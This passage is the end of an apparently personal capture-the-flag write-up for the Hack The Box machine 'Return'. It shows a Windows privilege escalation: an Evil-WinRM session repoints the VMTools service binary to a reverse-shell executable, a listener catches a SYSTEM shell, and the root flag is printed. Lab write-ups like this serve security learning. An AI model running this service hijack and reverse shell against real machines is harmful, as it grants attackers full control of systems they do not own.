+</span><span class="z-text z-plain">C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost
+</span><span class="z-text z-plain">&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;                                                False Sense
+</span><span class="z-text z-plain">C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller
+</span><span class="z-text z-plain">&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;                                                     True VGAuthService
+</span><span class="z-text z-plain">&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;                                                                        True VMTools
+</span><span class="z-text z-plain">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;                                             True WdNisSvc
+</span><span class="z-text z-plain">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;                                            True WinDefend
+</span><span class="z-text z-plain">&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;                                                                      False WMPNetworkSvc
+</span></code></pre>
+<p>I'll choose <code>VMTools</code>, since it's a privileged service.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's start by stopping <code>VMTools</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">sc.exe</span> stop <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>VMTools<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">SERVICE_NAME: VMTools
+</span><span class="z-text z-plain">        TYPE               : 10  WIN32_OWN_PROCESS
+</span><span class="z-text z-plain">        STATE              : 1  STOPPED
+</span><span class="z-text z-plain">        WIN32_EXIT_CODE    : 0  (0x0)
+</span><span class="z-text z-plain">        SERVICE_EXIT_CODE  : 0  (0x0)
+</span><span class="z-text z-plain">        CHECKPOINT         : 0x0
+</span><span class="z-text z-plain">        WAIT_HINT          : 0x0
+</span></code></pre>
+<p>Then, let's change the path of this service to our reverse shell binary.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">sc.exe</span> config <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>VMTools<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> binpath<span class="z-keyword z-operator z-assignment z-powershell">=</span><span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\tmp\revshell.exe<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[SC] ChangeServiceConfig SUCCESS
+</span></code></pre>
+<p>Finally, let's start it.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">sc.exe</span> start <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>VMTools<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[SC] StartService FAILED 1053:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">The service did not respond to the start or control request in a timely fashion.
+</span></code></pre>
+<p>We get an error message. But if we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.9] from (UNKNOWN) [10.10.11.108] 58836
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PS C:\Windows\system32&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>NT AUTHORITY\SYSTEM</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-Content</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\Administrator\Desktop\root.txt<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5fa43e110b22ca43d2a4bde49e86b19d
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/return/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated both the user and root flags as 'Easy' to obtain. I had a bit of trouble
+getting the foothold, as I was too focused on changing all the fields of the
+form instead of focusing on the IP. Once I got the idea of entering my own IP,
+it was very easy to obtain though. The privilege escalation was straightforward
+to identify, but the resources online regarrding its exploitation are scarce.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
